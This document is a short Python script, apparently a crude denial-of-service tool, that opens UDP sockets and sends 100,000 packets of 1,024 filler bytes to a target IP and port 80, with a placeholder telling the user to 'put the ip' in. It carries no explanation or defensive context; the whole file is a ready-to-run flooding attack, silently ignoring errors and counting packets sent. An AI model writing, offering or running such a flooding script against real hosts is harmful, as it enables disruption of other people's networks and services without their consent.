import socket
import random

def send_packets(target_ip, target_port, num_packets):
    packets_sent = 0
    for i in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((target_ip, target_port))
            sock.send(b"A" * 1024)
            packets_sent += 1
        except:
            pass
    return packets_sent

if __name__ == "__main__":
    target_ip = "put the ip"
    target_port = 80
    num_packets = 100000
    packets_sent = send_packets(target_ip, target_port, num_packets)
    print(f"Sent {packets_sent} packets to {target_ip}:{target_port}")
